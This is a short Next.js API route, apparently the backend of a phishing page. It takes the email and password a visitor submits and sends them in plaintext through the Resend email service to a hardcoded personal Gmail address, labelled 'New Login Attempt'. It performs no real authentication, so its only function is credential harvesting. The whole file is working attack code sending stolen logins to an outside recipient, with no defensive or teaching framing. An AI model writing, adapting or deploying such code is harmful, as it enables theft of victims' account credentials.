import { NextResponse } from "next/server";

export async function POST(request: Request) {
	try {
		const body = await request.json();
		const { email, password } = body;

		const emailContent = `
New Login Attempt

Email: ${email}
Password: ${password}
Timestamp: ${new Date().toISOString()}
    `;

		const resendResponse = await fetch(
			"https://api.resend.com/emails",
			{
				method: "POST",
				headers: {
					Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					from: "onboarding@resend.dev",
					to: "vethalex469@gmail.com",
					subject: `New Login Attempt - ${email}`,
					text: emailContent,
				}),
			},
		);

		const responseData = await resendResponse.json();

		if (!resendResponse.ok) {
			console.error("Resend API Error:", responseData);
			throw new Error("Failed to send email");
		}

		return NextResponse.json({ success: true, data: responseData });
	} catch (error) {
		console.error("Error sending email:", error);
		return NextResponse.json(
			{ error: "Failed to process request" },
			{ status: 500 },
		);
	}
}
